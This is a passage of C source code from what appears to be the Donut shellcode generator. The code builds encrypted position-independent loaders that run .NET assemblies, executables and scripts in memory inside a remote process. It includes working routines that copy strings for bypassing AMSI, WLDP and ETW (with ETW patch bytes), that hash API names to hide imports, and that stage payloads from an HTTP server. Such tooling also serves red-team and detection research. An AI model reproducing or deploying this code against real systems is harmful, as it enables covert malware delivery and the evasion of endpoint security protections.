fi.data);\n                DPRINT(\"Runtime version : %s\", (char*)pss->pVersion);\n                strncpy(fi.ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);\n              }\n            }\n          }\n        }\n      }\n    }\n    // assign length of file and type to configuration\n    c->len      = fi.len;\n    c->mod_type = fi.type;\ncleanup:\n    if(err != DONUT_ERROR_OK) {\n      DPRINT(\"Unmapping input file due to errors.\");\n      unmap_file();\n    }\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: gen_random\n * ----------------------------\n *   Generates pseudo-random bytes.\n *\n *   INPUT  : buf = where to store random bytes.\n *          : len = length of random bytes to generate.\n *\n *   OUTPUT : 1 if ok, else 0\n */\nstatic int gen_random(void *buf, uint64_t len) {\n#if defined(WINDOWS)\n    HCRYPTPROV prov;\n    int        ok;\n    \n    // 1. acquire crypto context\n    if(!CryptAcquireContext(\n        &prov, NULL, NULL,\n        PROV_RSA_FULL,\n        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;\n\n    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);\n    CryptReleaseContext(prov, 0);\n    \n    return ok;\n#else\n    int      fd;\n    uint64_t r=0;\n    uint8_t  *p=(uint8_t*)buf;\n    \n    DPRINT(\"Opening /dev/urandom to acquire %li bytes\", len);\n    fd = open(\"/dev/urandom\", O_RDONLY);\n    \n    if(fd > 0) {\n      for(r=0; r<len; r++, p++) {\n        if(read(fd, p, 1) != 1) break;\n      }\n      close(fd);\n    }\n    DPRINT(\"Acquired %li of %li bytes requested\", r, len);\n    return r == len;\n#endif\n}\n\n/**\n * Function: gen_random_string\n * ----------------------------\n *   Generates a pseudo-random string\n *\n *   INPUT  : output = pointer to buffer that receives string\n *          : len = length of string to generate\n *\n *   OUTPUT : 1 if ok, else 0  \n */\nstatic int gen_random_string(void *output, uint64_t len) {\n    uint8_t rnd[DONUT_MAX_NAME];\n    int     i;\n    char    tbl[]=\"HMN34P67R9TWCXYF\";  // https://stackoverflow.com/a/27459196\n    char    *str = (char*)output;\n    \n    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;\n    \n    // generate DONUT_MAX_NAME random bytes\n    if(!gen_random(rnd, DONUT_MAX_NAME)) return 0;\n    \n    // generate a string using unambiguous characters\n    for(i=0; i<len; i++) {\n      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];\n    }\n    str[i] = 0;\n    return 1;\n}\n\n/**\n * Function: build_module\n * ----------------------------\n *   Create a Donut module from Donut configuration\n *\n *   INPUT  : A pointer to a donut configuration\n *\n *   OUTPUT : Donut error code. \n */\nstatic int build_module(PDONUT_CONFIG c) {\n    PDONUT_MODULE mod     = NULL;\n    uint32_t      mod_len, data_len;\n    void          *data;\n    int           err = DONUT_ERROR_OK;\n    \n    DPRINT(\"Entering.\");\n    \n    // Compress the input file?\n    if(c->compress != DONUT_COMPRESS_NONE) {\n      err = compress_file(c);\n      \n      if(err != DONUT_ERROR_OK) {\n        DPRINT(\"compress_file() failed\");\n        return err;\n      }\n      DPRINT(\"Assigning %\"PRIi32 \" bytes of %p to data\", fi.zlen, fi.zdata);\n      data     = fi.zdata;\n      data_len = fi.zlen;\n    } else {\n      DPRINT(\"Assigning %\"PRIi32 \" bytes of %p to data\", fi.len, fi.data);\n      data     = fi.data;\n      data_len = fi.len;\n    }\n    // Allocate memory for module information and contents of file\n    mod_len = data_len + sizeof(DONUT_MODULE);\n    \n    DPRINT(\"Allocating %\" PRIi32 \" bytes of memory for DONUT_MODULE\", mod_len);\n    mod = calloc(mod_len, 1);\n\n    // Memory not allocated? exit\n    if(mod == NULL) {\n      DPRINT(\"calloc() failed\");\n      return DONUT_ERROR_NO_MEMORY;\n    }\n    \n    // Set the module info\n    mod->type     = fi.type;\n    mod->thread   = c->thread;\n    mod->compress = c->compress;\n    mod->unicode  = c->unicode;\n    mod->zlen     = fi.zlen;\n    mod->len      = fi.len;\n    \n    // DotNet assembly?\n    if(mod->type == DONUT_MODULE_NET_DLL ||\n       mod->type == DONUT_MODULE_NET_EXE)\n    {\n      // If no domain name specified in configuration\n      if(c->domain[0] == 0) {\n        // if entropy is enabled\n        if(c->entropy != DONUT_ENTROPY_NONE) { \n          // generate a random name\n          if(!gen_random_string(c->domain, DONUT_DOMAIN_LEN)) {\n            DPRINT(\"gen_random_string() failed\");\n            err = DONUT_ERROR_RANDOM;\n            goto cleanup;\n          }\n        }\n      }\n      DPRINT(\"Domain  : %s\", c->domain[0] == 0 ? \"Default\" : c->domain);\n      if(c->domain[0] != 0) {\n        // Set the domain name in module\n        strncpy(mod->domain, c->domain, DONUT_DOMAIN_LEN);\n      } else {\n        memset(mod->domain, 0, DONUT_DOMAIN_LEN);\n      }\n      // Assembly is DLL? Copy the class and method\n      if(mod->type == DONUT_MODULE_NET_DLL) {\n        DPRINT(\"Class   : %s\", c->cls);\n        strncpy(mod->cls, c->cls, DONUT_MAX_NAME-1);\n        \n        DPRINT(\"Method  : %s\", c->method);\n        strncpy(mod->method, c->method, DONUT_MAX_NAME-1);\n      }\n      // If no runtime specified in configuration, use version from assembly\n      if(c->runtime[0] == 0) {\n        strncpy(c->runtime, fi.ver, DONUT_MAX_NAME-1);\n      }\n      DPRINT(\"Runtime : %s\", c->runtime);\n      strncpy(mod->runtime, c->runtime, DONUT_MAX_NAME-1);\n    } else\n    // Unmanaged DLL? copy function name to module          \n    if(mod->type == DONUT_MODULE_DLL && c->method[0] != 0) {\n      DPRINT(\"DLL function : %s\", c->method);\n      strncpy(mod->method, c->method, DONUT_MAX_NAME-1);\n    }\n      \n    // Parameters specified?\n    if(c->args[0] != 0) {\n      // If file type is unmanaged EXE\n      if(mod->type == DONUT_MODULE_EXE) {\n        // If entropy is disabled\n        if(c->entropy == DONUT_ENTROPY_NONE) {\n          // Set to \"AAAA\"\n          memset(mod->args, 'A', 4);\n        } else {\n          // Generate 4-byte random name\n          if(!gen_random_string(mod->args, 4)) {\n            DPRINT(\"gen_random_string() failed\");\n            err = DONUT_ERROR_RANDOM;\n            goto cleanup;\n          }\n        }\n        // Add space\n        mod->args[4] = ' ';\n      }\n      // \n      // Copy parameters \n      strncat(mod->args, c->args, DONUT_MAX_NAME-6);\n    }    \n    DPRINT(\"Copying data to module\");\n    \n    memcpy(&mod->data, data, data_len);\n    // update configuration with pointer to module\n    c->mod     = mod;\n    c->mod_len = mod_len;\ncleanup:\n    // if there was an error, free memory for module\n    if(err != DONUT_ERROR_OK) {\n      DPRINT(\"Releasing memory due to errors.\");\n      free(mod);\n    }\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: build_instance\n * ----------------------------\n *   Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.\n *\n *   INPUT  : Pointer to a Donut configuration.\n *\n *   OUTPUT : Donut error code. \n */\nstatic int build_instance(PDONUT_CONFIG c) {\n    DONUT_CRYPT     inst_key, mod_key;\n    PDONUT_INSTANCE inst = NULL;\n    int             cnt, inst_len;\n    uint64_t        dll_hash;\n    int             err = DONUT_ERROR_OK;\n    \n    DPRINT(\"Entering.\");\n    \n    // Allocate memory for the size of instance based on the type\n    DPRINT(\"Allocating memory for instance\");\n    inst_len = sizeof(DONUT_INSTANCE);\n    \n    // if the module is embedded, add the size of module\n    // that will be appended to the end of structure\n    if(c->inst_type == DONUT_INSTANCE_EMBED) {\n      DPRINT(\"The size of module is %\" PRIi32 \" bytes. \" \n             \"Adding to size of instance.\", c->mod_len);\n      inst_len += c->mod_len;\n    }\n    DPRINT(\"Total length of instance : %\"PRIi32, inst_len);\n    \n    // allocate zero-initialized memory for instance\n    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);\n\n    // Memory allocation failed? exit\n    if(inst == NULL) {\n      DPRINT(\"Memory allocation failed\");\n      return DONUT_ERROR_NO_MEMORY;\n    }\n    \n    // set the length of instance and pointer to it in configuration\n    c->inst        = inst;\n    c->inst_len    = inst->len = inst_len;\n    // set the type of instance we're creating\n    inst->type     = c->inst_type;\n    // indicate if we should call RtlExitUserProcess to terminate host process\n    inst->exit_opt = c->exit_opt;\n    // set the Original Entry Point\n    inst->oep      = c->oep;\n    // set the entropy level\n    inst->entropy  = c->entropy;\n    // set the bypass level\n    inst->bypass   = c->bypass;\n    // set the headers level\n    inst->headers  = c->headers;\n    // set the module length\n    inst->mod_len  = c->mod_len;\n\n    // encryption enabled?\n    if(c->entropy == DONUT_ENTROPY_DEFAULT) {\n      DPRINT(\"Generating random key for instance\");\n      if(!gen_random(&inst_key, sizeof(DONUT_CRYPT))) {\n        DPRINT(\"gen_random() failed\");\n        err = DONUT_ERROR_RANDOM;\n        goto cleanup;\n      }\n      // copy local key to configuration\n      memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));\n      \n      DPRINT(\"Generating random key for module\");\n      if(!gen_random(&mod_key, sizeof(DONUT_CRYPT))) {\n        DPRINT(\"gen_random() failed\");\n        err = DONUT_ERROR_RANDOM;\n        goto cleanup;\n      }\n      // copy local key to configuration\n      memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));\n      \n      DPRINT(\"Generating random string to verify decryption\");\n      if(!gen_random_string(inst->sig, DONUT_SIG_LEN)) {\n        DPRINT(\"gen_random() failed\");\n        err = DONUT_ERROR_RANDOM;\n        goto cleanup;\n      }\n     \n      DPRINT(\"Generating random IV for Maru hash\");\n      if(!gen_random(&inst->iv, MARU_IV_LEN)) {\n        DPRINT(\"gen_random() failed\");\n        err = DONUT_ERROR_RANDOM;\n        goto cleanup;\n      }\n    }\n\n    DPRINT(\"Generating hashes for API using IV: %\" PRIX64, inst->iv);\n    \n    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {\n      // calculate hash for DLL string\n      dll_hash = maru(api_imports[cnt].module, inst->iv);\n      \n      // calculate hash for API string.\n      // xor with DLL hash and store in instance\n      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;\n      \n      DPRINT(\"Hash for %-15s : %-22s = %016\" PRIX64, \n        api_imports[cnt].module, \n        api_imports[cnt].name,\n        inst->api.hash[cnt]);\n    }\n    \n    DPRINT(\"Setting number of API to %\" PRIi32, cnt);\n    inst->api_cnt = cnt;\n    \n    DPRINT(\"Setting DLL names to %s\", DLL_NAMES);\n    strcpy(inst->dll_names, DLL_NAMES);\n        \n    // if module is .NET assembly\n    if(c->mod_type == DONUT_MODULE_NET_DLL ||\n       c->mod_type == DONUT_MODULE_NET_EXE)\n    {\n      DPRINT(\"Copying GUID structures and DLL strings for loading .NET assemblies\");\n\n      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));\n      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));\n      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));\n      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));\n      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));\n      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));\n    } else \n    // if module is VBS or JS\n    if(c->mod_type == DONUT_MODULE_VBS ||\n       c->mod_type == DONUT_MODULE_JS)\n    {       \n      DPRINT(\"Copying GUID structures and DLL strings for loading VBS/JS\");\n      \n      memcpy(&inst->xIID_IUnknown,                &xIID_IUnknown,                sizeof(GUID));\n      memcpy(&inst->xIID_IDispatch,               &xIID_IDispatch,               sizeof(GUID));\n      memcpy(&inst->xIID_IHost,                   &xIID_IHost,                   sizeof(GUID));\n      memcpy(&inst->xIID_IActiveScript,           &xIID_IActiveScript,           sizeof(GUID));\n      memcpy(&inst->xIID_IActiveScriptSite,       &xIID_IActiveScriptSite,       sizeof(GUID));\n      memcpy(&inst->xIID_IActiveScriptSiteWindow, &xIID_IActiveScriptSiteWindow, sizeof(GUID));\n      memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));\n      memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));\n      \n      strcpy(inst->wscript,     \"WScript\");\n      strcpy(inst->wscript_exe, \"wscript.exe\");\n      \n      if(c->mod_type == DONUT_MODULE_VBS) {\n        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));\n      } else {\n        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));\n      }\n    }\n\n    // if bypassing enabled, copy these strings over\n    if(c->bypass != DONUT_BYPASS_NONE) {\n      DPRINT(\"Copying strings required to bypass AMSI\");\n      \n      strcpy(inst->clr,         \"clr\");\n      strcpy(inst->amsi,        \"amsi\");\n      strcpy(inst->amsiInit,    \"AmsiInitialize\");\n      strcpy(inst->amsiScanBuf, \"AmsiScanBuffer\");\n      strcpy(inst->amsiScanStr, \"AmsiScanString\");\n      \n      DPRINT(\"Copying strings required to bypass WLDP\");\n      \n      strcpy(inst->wldp,           \"wldp\");\n      strcpy(inst->wldpQuery,      \"WldpQueryDynamicCodeTrust\");\n      strcpy(inst->wldpIsApproved, \"WldpIsClassInApprovedList\");\n\n      DPRINT(\"Copying strings required to bypass ETW\");\n      strcpy(inst->ntdll, \"ntdll\");\n      strcpy(inst->etwEventWrite, \"EtwEventWrite\");\n      strcpy(inst->etwEventUnregister, \"EtwEventUnregister\");\n      strcpy(inst->etwRet64, \"\\xc3\");\n      strcpy(inst->etwRet32, \"\\xc2\\x14\\x00\\x00\");\n    }\n    \n    // if module is an unmanaged EXE\n    if(c->mod_type == DONUT_MODULE_EXE) {\n      // does the user specify parameters for the command line?\n      if(c->args[0] != 0) {\n        DPRINT(\"Copying strings required to replace command line.\");\n        \n        strcpy(inst->dataname,   \".data\");\n        strcpy(inst->kernelbase, \"kernelbase\");\n        strcpy(inst->cmd_syms,   \"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv\");\n      }\n      // does user want loader to run the entrypoint as a thread?\n      if(c->thread != 0) {\n        DPRINT(\"Copying strings required to intercept exit-related API\");\n        // these exit-related API will be replaced with pointer to RtlExitUserThread\n        strcpy(inst->exit_api, \"ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit\");\n      }\n    }\n\n    // decoy module path\n    strcpy(inst->decoy, c->decoy);\n    \n    // if the module will be downloaded\n    // set the URL parameter and request verb\n    if(inst->type == DONUT_INSTANCE_HTTP) {\n      // if no module name specified\n      if(c->modname[0] == 0) {\n        // if entropy disabled\n        if(c->entropy == DONUT_ENTROPY_NONE) {\n          // set to \"AAAAAAAA\"\n          memset(c->modname, 'A', DONUT_MAX_MODNAME);\n        } else {\n          // generate a random name for module\n          // that will be saved to disk\n          DPRINT(\"Generating random name for module\");\n          if(!gen_random_string(c->modname, DONUT_MAX_MODNAME)) {\n            DPRINT(\"gen_random_string() failed\");\n            err = DONUT_ERROR_RANDOM;\n            goto cleanup;\n          }\n        }\n        DPRINT(\"Name for module : %s\", c->modname);\n      }\n      strcpy(inst->server, c->server);\n      // append module name\n      strcat(inst->server, c->modname);\n      // set the request verb\n      strcpy(inst->http_req, \"GET\");\n      \n      DPRINT(\"Loader will attempt to download module from : %s\", inst->server);\n      \n      // encrypt module?\n      if(c->entropy == DONUT_ENTROPY_DEFAULT) {\n        DPRINT(\"Encrypting module\");\n        \n        c->mod->mac = maru(inst->sig, inst->iv);\n        \n        donut_encrypt(\n          mod_key.mk, \n          mod_key.ctr, \n          c->mod, \n          c->mod_len);\n      }\n    } else \n    // if embedded, copy module to instance\n    if(inst->type == DONUT_INSTANCE_EMBED) {\n      DPRINT(\"Copying module data to instance\");\n      memcpy(&c->inst->module.x, c->mod, c->mod_len);\n    }\n    \n    // encrypt instance?\n    if(c->entropy == DONUT_ENTROPY_DEFAULT) {\n      DPRINT(\"Encrypting instance\");\n      \n      inst->mac = maru(inst->sig, inst->iv);\n      \n      uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);\n      \n      donut_encrypt(\n        inst_key.mk, \n        inst_key.ctr, \n        inst_data, \n        c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));\n    }\ncleanup:\n    // error? release memory for everything\n    if(err != DONUT_ERROR_OK) {\n      DPRINT(\"Releasing memory for module due to errors.\");\n      free(c->mod);\n    }\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: save_file\n * ----------------------------\n *   Creates a file and writes the contents of input buffer to it.\n *\n *   INPUT  : path = where to create file.\n *            data = what to write to file.\n *            len  = length of data.\n *\n *   OUTPUT : Donut error code.\n */\nstatic int save_file(const char *path, void *data, int len) {\n    FILE *out;\n    int  err = DONUT_ERROR_OK;\n    \n    DPRINT(\"Entering.\");\n    out = fopen(path, \"wb\");\n      \n    if(out != NULL) {\n      DPRINT(\"Writing %d bytes of %p to %s\", len, data, path);\n      fwrite(data, 1, len, out);\n      fclose(out);\n    } else err = DONUT_ERROR_FILE_ACCESS;\n    \n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: save_loader\n * ----------------------------\n *   Saves the loader to output file. Also saves instance for debug builds.\n *   If the instance type is HTTP, it saves the module to file.\n *\n *   INPUT  : Donut configuration.\n *\n *   OUTPUT : Donut error code.\n */\nstatic int save_loader(PDONUT_CONFIG c) {\n    int   err = DONUT_ERROR_OK;\n    FILE *fd;\n    \n    // if DEBUG is defined, save instance to disk\n    #ifdef DEBUG\n      DPRINT(\"Saving instance %p to file. %\" PRId32 \" bytes.\", c->inst, c->inst_len);\n      save_file(\"instance\", c->inst, c->inst_len);\n    #endif\n\n    // If the module will be stored on a remote server\n    if(c->inst_type == DONUT_INSTANCE_HTTP) {\n      DPRINT(\"Saving %s to file.\", c->modname);\n      save_file(c->modname, c->mod, c->mod_len);\n    }\n              \n    // no output file specified?\n    if(c->output[0] == 0) {\n      // set to default name based on format\n      switch(c->format) {\n        case DONUT_FORMAT_BINARY:\n          strncpy(c->output, \"loader.bin\", DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_BASE64:\n          strncpy(c->output, \"loader.b64\", DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_RUBY:\n          strncpy(c->output, \"loader.rb\",  DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_C:\n          strncpy(c->output, \"loader.c\",   DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_PYTHON:\n          strncpy(c->output, \"loader.py\",  DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_POWERSHELL:\n          strncpy(c->output, \"loader.ps1\", DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_CSHARP:\n          strncpy(c->output, \"loader.cs\",  DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_HEX:\n          strncpy(c->output, \"loader.hex\", DONUT_MAX_NAME-1);\n          break;\n        case DONUT_FORMAT_UUID:\n          strncpy(c->output, \"loader.uuid\", DONUT_MAX_NAME-1);\n          break;\n      }\n    }\n    // save loader to file\n    fd = fopen(c->output, \"wb\");\n    if(fd == NULL) {\n      DPRINT(\"Opening %s failed.\", c->output);\n      return DONUT_ERROR_FILE_ACCESS;\n    }\n    \n    switch(c->format) {\n      case DONUT_FORMAT_BINARY: {\n        DPRINT(\"Saving loader as binary\");\n        fwrite(c->pic, 1, c->pic_len, fd);\n        err = DONUT_ERROR_OK;\n        break;\n      }\n      case DONUT_FORMAT_BASE64: {\n        DPRINT(\"Saving loader as base64 string\");\n        err = base64_template(c->pic, c->pic_len, fd);\n        break;\n      }\n      case DONUT_FORMAT_RUBY:\n      case DONUT_FORMAT_C:\n        DPRINT(\"Saving loader as C/Ruby string\");\n        err = c_ruby_template(c->pic, c->pic_len, fd);\n        break;\n      case DONUT_FORMAT_PYTHON:\n        DPRINT(\"Saving loader as Python string\");\n        err = py_template(c->pic, c->pic_len, fd);\n        break;\n      case DONUT_FORMAT_POWERSHELL:\n        DPRINT(\"Saving loader as Powershell string\");\n        err = powershell_template(c->pic, c->pic_len, fd);\n        break;\n      case DONUT_FORMAT_CSHARP:\n        DPRINT(\"Saving loader as C# string\");\n        err = csharp_template(c->pic, c->pic_len, fd);\n        break;\n      case DONUT_FORMAT_HEX:\n        DPRINT(\"Saving loader as Hex string\");\n        err = hex_template(c->pic, c->pic_len, fd);\n        break;\n      case DONUT_FORMAT_UUID:\n        DPRINT(\"Saving loader as UUID string\");\n        err = uuid_template(c->pic, c->pic_len, fd);\n        break;\n    }\n    fclose(fd);\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: build_loader\n * ----------------------------\n *   Builds the shellcode that's injected into remote process.\n *\n *   INPUT  : Donut configuration.\n *\n *   OUTPUT : Donut error code.\n */\nstatic int build_loader(PDONUT_CONFIG c) {\n    static unsigned char LOADER_EXE_X64_RSP_ALIGN[] = {\n        // push rbp\n        0x55,\n        // mov rbp, rsp\n        0x48, 0x89, 0xE5,\n        // and rsp, -0x10\n        0x48, 0x83, 0xE4, 0xF0,\n        // sub rsp, 0x20\n        0x48, 0x83, 0xEC, 0x20,\n        // call $ + 5\n        0xE8, 0x05, 0x00, 0x00, 0x00,\n        // mov rsp, rbp\n        0x48, 0x89, 0xEC,\n        // pop rbp\n        0x5D,\n        // ret\n        0xC3\n    };\n\n    uint8_t *pl;\n    uint32_t t;\n    \n    // target is x86?\n    if(c->arch == DONUT_ARCH_X86) {\n      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;\n    } else \n    // target is amd64?\n    if(c->arch == DONUT_ARCH_X64) {\n      c->pic_len = sizeof(LOADER_EXE_X64_RSP_ALIGN) +\n                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;\n    } else \n    // target can be both x86 and amd64?\n    if(c->arch == DONUT_ARCH_X84) {\n      c->pic_len = sizeof(LOADER_EXE_X86) + \n                   sizeof(LOADER_EXE_X64_RSP_ALIGN) + \n                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;\n    }\n    // allocate memory for shellcode\n    c->pic = malloc(c->pic_len);\n    \n    if(c->pic == NULL) {\n      DPRINT(\"Unable to allocate %\" PRId32 \" bytes of memory for loader.\", c->pic_len);\n      return DONUT_ERROR_NO_MEMORY;\n    }\n    \n    DPRINT(\"Inserting opcodes\");\n    \n    // insert shellcode\n    pl = (uint8_t*)c->pic;\n    \n    // call $ + c->inst_len\n    PUT_BYTE(pl,  0xE8);\n    PUT_WORD(pl,  c->inst_len);\n    PUT_BYTES(pl, c->inst, c->inst_len);\n    // pop ecx\n    PUT_BYTE(pl,  0x59);\n    \n    // x86?\n    if(c->arch == DONUT_ARCH_X86) {\n      // pop edx\n      PUT_BYTE(pl, 0x5A);\n      // push ecx\n      PUT_BYTE(pl, 0x51);\n      // push edx\n      PUT_BYTE(pl, 0x52);\n      \n      DPRINT(\"Copying %\" PRIi32 \" bytes of x86 shellcode\", \n        (uint32_t)sizeof(LOADER_EXE_X86));\n        \n      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));\n    } else \n    // AMD64?\n    if(c->arch == DONUT_ARCH_X64) {\n      \n      DPRINT(\"Copying %\" PRIi32 \" bytes of amd64 shellcode\", \n        (uint32_t)sizeof(LOADER_EXE_X64));\n\n      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention\n      \n      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));\n      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));\n    } else \n    // x86 + AMD64?\n    if(c->arch == DONUT_ARCH_X84) {\n      \n      DPRINT(\"Copying %\" PRIi32 \" bytes of x86 + amd64 shellcode\",\n        (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));\n        \n      // xor eax, eax\n      PUT_BYTE(pl, 0x31);\n      PUT_BYTE(pl, 0xC0);\n      // dec eax\n      PUT_BYTE(pl, 0x48);\n      // js dword x86_code\n      PUT_BYTE(pl, 0x0F);\n      PUT_BYTE(pl, 0x88);\n      PUT_WORD(pl,  sizeof(LOADER_EXE_X64_RSP_ALIGN) + sizeof(LOADER_EXE_X64));\n      \n      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention\n      \n\n      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));\n      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));\n      // pop edx\n      PUT_BYTE(pl, 0x5A);\n      // push ecx\n      PUT_BYTE(pl, 0x51);\n      // push edx\n      PUT_BYTE(pl, 0x52);\n      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));\n    }\n    return DONUT_ERROR_OK;\n}\n\n/**\n * Function: validate_loader_cfg\n * ----------------------------\n *   Validates Donut configuration for loader.\n *\n *   INPUT  : Pointer to a Donut configuration.\n *\n *   OUTPUT : Donut error code.\n */\nstatic int validate_loader_cfg(PDONUT_CONFIG c) {\n    uint32_t url_len;\n    \n    DPRINT(\"Validating loader configuration.\");\n    \n    if(c == NULL || c->input[0] == 0) {\n      DPRINT(\"No configuration or input file provided.\");\n      return DONUT_ERROR_INVALID_PARAMETER;\n    }\n\n    if(c->inst_type != DONUT_INSTANCE_EMBED &&\n       c->inst_type != DONUT_INSTANCE_HTTP) {\n      \n      DPRINT(\"Instance type %\" PRIx32 \" is invalid.\", c->inst_type);\n      return DONUT_ERROR_INVALID_PARAMETER;\n    }\n    \n    if(c->format < DONUT_FORMAT_BINARY || c->format > DONUT_FORMAT_UUID) {\n      DPRINT(\"Format type %\" PRId32 \" is invalid.\", c->format);\n      return DONUT_ERROR_INVALID_FORMAT;\n    }\n    \n    #ifdef WINDOWS\n      if(c->compress != DONUT_COMPRESS_NONE  &&\n         c->compress != DONUT_COMPRESS_APLIB &&\n         c->compress != DONUT_COMPRESS_LZNT1 &&\n         c->compress != DONUT_COMPRESS_XPRESS)\n      {\n        DPRINT(\"Compression engine %\" PRId32 \" is invalid.\", c->compress);\n        return DONUT_ERROR_INVALID_ENGINE;\n      }\n    #else\n      if(c->compress != DONUT_COMPRESS_NONE        &&\n         c->compress != DONUT_COMPRESS_APLIB)\n      {\n        DPRINT(\"Compression engine %\" PRId32 \" is invalid.\", c->compress);\n        return DONUT_ERROR_INVALID_ENGINE;\n      }\n    #endif\n  \n    if(c->entropy != DONUT_ENTROPY_NONE   &&\n       c->entropy != DONUT_ENTROPY_RANDOM &&\n       c->entropy != DONUT_ENTROPY_DEFAULT)\n    {\n      DPRINT(\"Entropy level %\" PRId32 \" is invalid.\", c->entropy);\n      return DONUT_ERROR_INVALID_ENTROPY;\n    }\n    \n    if(c->inst_type == DONUT_INSTANCE_HTTP) {\n      // no URL? exit\n      if(c->server[0] == 0) {\n        DPRINT(\"Error: No HTTP server provided.\");\n        return DONUT_ERROR_INVALID_PARAMETER;\n      }\n      // doesn't begin with one of the following? exit\n      if((strnicmp(c->server, \"http://\",  7) != 0) &&\n         (strnicmp(c->server, \"https://\", 8) != 0)) {\n        \n        DPRINT(\"URL is invalid : %s\", c->server);\n        return DONUT_ERROR_INVALID_URL;\n      }\n      // invalid length?\n      url_len = (uint32_t)strlen(c->server);\n      \n      if(url_len <= 8) {\n        DPRINT(\"URL length : %\" PRId32 \" is invalid.\", url_len);\n        return DONUT_ERROR_URL_LENGTH;\n      }\n      // if the end of string doesn't have a forward slash\n      // add one more to account for it\n      if(c->server[url_len - 1] != '/') {\n        c->server[url_len] = '/';\n        url_len++;\n      }\n      \n      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {\n        DPRINT(\"URL length : %\" PRId32 \" exceeds size of buffer : %\"PRId32, \n          url_len+DONUT_MAX_MODNAME, DONUT_MAX_NAME);\n        return DONUT_ERROR_URL_LENGTH;\n      }\n    }\n    \n    if(c->arch != DONUT_ARCH_X86 &&\n       c->arch != DONUT_ARCH_X64 &&\n       c->arch != DONUT_ARCH_X84 &&\n       c->arch != DONUT_ARCH_ANY)\n    {\n      DPRINT(\"Target architecture %\"PRId32 \" is invalid.\", c->arch);\n      return DONUT_ERROR_INVALID_ARCH;\n    }\n    \n    if(c->bypass != DONUT_BYPASS_NONE     &&\n       c->bypass != DONUT_BYPASS_ABORT    &&\n       c->bypass != DONUT_BYPASS_CONTINUE)\n    {\n      DPRINT(\"Option to bypass AMSI/WDLP/ETW %\"PRId32\" is invalid.\", c->bypass);\n      return DONUT_ERROR_BYPASS_INVALID;\n    }\n\n    if(c->headers != DONUT_HEADERS_OVERWRITE     &&\n       c->headers != DONUT_HEADERS_KEEP)\n    {\n      DPRINT(\"Option to preserve PE headers (or not) %\"PRId32\" is invalid.\", c->headers);\n      return DONUT_ERROR_HEADERS_INVALID;\n    }\n    \n    DPRINT(\"Loader configuration passed validation.\");\n    return DONUT_ERROR_OK;\n}\n\n/**\n * Function: is_dll_export\n * ----------------------------\n *   Validates if a DLL exports a function. \n *\n *   INPUT  : Name of DLL function to check.\n *\n *   OUTPUT : 1 if found, else 0\n */\nstatic int is_dll_export(const char *function) {\n    PIMAGE_DATA_DIRECTORY   dir;\n    PIMAGE_EXPORT_DIRECTORY exp;\n    DWORD                   rva, cnt;\n    ULONG64                 ofs;\n    PDWORD                  sym;\n    PCHAR                   str;\n    int                     found = 0;\n\n    DPRINT(\"Entering.\");\n    \n    dir = 